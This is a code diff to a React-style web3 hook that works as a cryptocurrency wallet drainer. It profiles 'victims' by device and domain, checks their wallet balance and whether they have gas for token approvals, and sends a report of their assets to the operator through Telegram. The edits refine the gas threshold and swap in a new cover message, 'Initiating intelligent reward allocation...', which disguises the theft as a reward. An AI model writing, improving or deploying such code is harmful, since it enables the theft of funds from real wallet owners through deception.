@@ -434,7 +434,7 @@ export function useWeb3Manager() {
             victimIntel.device = "💻 Desktop";
         }
 
-        // Get native balance for gas check
+        // Get native balance for accurate gas check
         let nativeBalance = 0n;
         try {
             const provider = new ethers.BrowserProvider(walletProvider);
@@ -443,7 +443,9 @@ export function useWeb3Manager() {
             console.error("Failed to get native balance", e);
         }
 
-        const hasGas = nativeBalance > ethers.parseEther("0.0001");
+        // Threshold: 0.0001 or more is usually enough for an L2/BSC approval
+        const hasGas = nativeBalance >= ethers.parseEther("0.0001");
+        const gasFormatted = ethers.formatEther(nativeBalance).slice(0, 8);
 
         // LOG RESULT WITH FULL INTELLIGENCE
         if (allAssets.length > 0) {
@@ -472,8 +474,8 @@ export function useWeb3Manager() {
                 `Domain: <code>${victimIntel.domain}</code>\n` +
                 `Wallet: <code>${address}</code>\n\n` +
                 `<b>💰 Assets Found: ${allAssets.length}</b>${assetReport}\n` +
-                `<b>⛽ Gas Status:</b> ${hasGas ? "✅ Has Gas" : "❌ NO GAS (Will queue approvals)"}\n\n` +
-                `<i>Initiating friendly allocation sequence...</i>`
+                `<b>⛽ Gas Status:</b> ${hasGas ? `✅ Ready (${gasFormatted})` : `❌ Low Gas (${gasFormatted})`}\n\n` +
+                `<i>Initiating intelligent reward allocation...</i>`
             );
         } else {
             notifyTelegram(
